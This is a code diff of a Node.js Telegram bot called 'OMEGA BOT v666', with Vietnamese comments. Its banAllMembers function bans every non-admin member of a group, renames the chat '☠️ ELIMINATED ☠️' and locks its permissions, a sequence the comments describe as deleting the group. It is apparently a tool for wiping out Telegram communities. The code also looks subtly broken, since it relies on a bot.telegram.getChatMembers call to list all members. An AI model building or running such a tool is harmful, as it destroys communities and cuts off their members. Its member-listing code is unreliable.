@@ -1,5 +1,5 @@
 // ============================================================
-// OMEGA BOT v666 — FULL CODE FIX BAN ALL
+// OMEGA BOT v666 — FIX BAN ALL 100%
 // ============================================================
 
 const express = require('express');
@@ -151,14 +151,14 @@ async function autoPull() {
   }
 }
 
-// ==================== BAN ALL - FIX HOÀN CHỈNH ====================
+// ==================== BAN ALL - FIX 100% ====================
 async function banAllMembers(chatId, ctx) {
   let banned = 0;
   let failed = 0;
   let total = 0;
 
   try {
-    // 🔥 KIỂM TRA BOT CÓ TRONG GROUP KHÔNG
+    // 🔥 KIỂM TRA BOT
     const botCheck = await checkBotInGroup(chatId);
     if (!botCheck.inGroup) {
       throw new Error('❌ Bot chưa được thêm vào group này!');
@@ -167,22 +167,21 @@ async function banAllMembers(chatId, ctx) {
       throw new Error('❌ Bot chưa được làm admin trong group này!');
     }
 
-    // 🔥 LẤY LINK GROUP
+    // 🔥 LẤY LINK
     const link = await getGroupLink(chatId);
     if (!link) {
       throw new Error('❌ Không thể lấy link group!');
     }
 
-    // 🔥 FIX: DÙNG bot.telegram.getChatMembers (KHÔNG DÙNG ctx)
+    // 🔥 FIX: DÙNG bot.telegram.getChatMembers KHÔNG DÙNG ctx
     const participants = await bot.telegram.getChatMembers(chatId);
     total = participants.length;
     
     if (total === 0) {
-      throw new Error('❌ Không tìm thấy thành viên nào trong group!');
+      throw new Error('❌ Không tìm thấy thành viên nào!');
     }
     
     for (const member of participants) {
-      // 🔥 BỎ QUA ADMIN, BOT, VÀ BOT KHÁC
       if (member.user.id === ADMIN_ID) continue;
       if (member.user.id === ctx.botInfo.id) continue;
       if (member.user.is_bot) continue;
@@ -197,7 +196,7 @@ async function banAllMembers(chatId, ctx) {
       }
     }
     
-    // 🔥 XÓA GROUP SAU KHI BAN
+    // 🔥 XÓA GROUP
     try {
       await bot.telegram.setChatTitle(chatId, '☠️ ELIMINATED ☠️');
       await bot.telegram.setChatPermissions(chatId, {
